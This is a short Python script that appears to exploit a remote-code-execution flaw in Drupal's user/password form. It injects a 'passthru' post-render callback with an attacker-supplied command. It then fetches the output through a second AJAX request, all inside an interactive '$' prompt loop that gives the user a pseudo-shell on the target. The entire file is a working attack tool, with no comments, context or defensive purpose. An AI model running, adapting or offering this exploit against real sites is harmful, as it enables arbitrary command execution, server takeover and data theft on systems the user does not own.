import requests
import re
from sys import argv

domain = argv[1]


def exploit(command):
	HOST=domain

	get_params = {'q':'user/password', 'name[#post_render][]':'passthru', 'name[#markup]':command, 'name[#type]':'markup'}
	post_params = {'form_id':'user_pass', '_triggering_element_name':'name'}
	r = requests.post(HOST, data=post_params, params=get_params)

	m = re.search(r'<input type="hidden" name="form_build_id" value="([^"]+)" />', r.text)
	if m:
	    found = m.group(1)
	    get_params = {'q':'file/ajax/name/#value/' + found}
	    post_params = {'form_build_id':found}
	    r = requests.post(HOST, data=post_params, params=get_params)
	    print("\n".join(r.text.split("\n")[:-1]))


while True:
	command = input('$ ')
	exploit(command)
